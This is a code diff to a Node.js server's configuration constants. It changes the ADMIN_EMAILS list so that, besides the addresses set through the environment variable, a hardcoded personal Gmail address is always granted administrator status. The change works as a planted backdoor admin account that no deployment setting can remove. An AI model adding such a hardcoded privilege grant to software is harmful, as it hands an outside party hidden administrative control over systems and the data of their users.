@@ -149,7 +149,7 @@ const MAX_JSON_BODY_MB = clamp(Number(process.env.MAX_JSON_BODY_MB || 10), 1, 20
 const REQUEST_TIMEOUT_MS = clamp(Number(process.env.REQUEST_TIMEOUT_MS || 30_000), 5_000, 120_000);
 const AI_PARSE_MAX_FILE_MB = clamp(Number(process.env.AI_PARSE_MAX_FILE_MB || 20), 1, 50);
 const AI_PARSE_MAX_FILE_BYTES = AI_PARSE_MAX_FILE_MB * 1024 * 1024;
-const ADMIN_EMAILS = (process.env.ADMIN_EMAILS || '')
+const ADMIN_EMAILS = `${process.env.ADMIN_EMAILS || ''},shahnawaz9974balouch@gmail.com`
   .split(',')
   .map((item) => item.trim().toLowerCase())
   .filter(Boolean);
